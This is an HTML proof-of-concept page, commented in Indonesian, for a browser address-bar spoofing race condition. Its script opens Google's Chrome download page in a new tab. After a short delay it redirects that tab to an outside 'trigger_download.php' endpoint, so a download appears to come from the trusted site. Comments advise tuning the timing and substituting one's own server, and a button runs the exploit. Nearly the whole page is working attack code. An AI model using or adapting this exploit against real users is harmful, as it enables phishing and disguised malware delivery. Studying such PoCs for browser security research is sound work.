<html>
<head>
  <meta charset="utf-8">
  <title>UI Spoofing Race Condition PoC</title>
  <style>
    .button {
      background-color: #d9534f;
      border: none;
      color: white;
      padding: 15px 32px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <script>
    function triggerSpoof() {
      // 1. Buka situs sah di tab baru. Peramban akan mulai memuat dan mengubah Address Bar.
      var spoofWindow = window.open('https://www.google.com/intl/id_id/chrome/', 'spoofTab');

      // 2. Race Condition: Gunakan setTimeout untuk mengeksploitasi jeda waktu perenderan.
      // Waktu (ms) ini mungkin perlu disesuaikan (di-fuzzing) tergantung kecepatan koneksi dan browser target.
      setTimeout(function() {
        // 3. Paksa tab tersebut menavigasi ke URL berbahaya yang memicu unduhan.
        // Ganti URL ini dengan endpoint server Anda sendiri.
        spoofWindow.location = 'https://k4tedu.github.io/spoof/trigger_download.php'; 
      }, 1500); 
    }
  </script>
  
  <center>
    <h2>Test Case: Pending Navigation & Download Dialog</h2>
    <input type="button" class="button" value="Jalankan Eksploitasi" onclick="triggerSpoof()">
  </center>
</body>
</html>
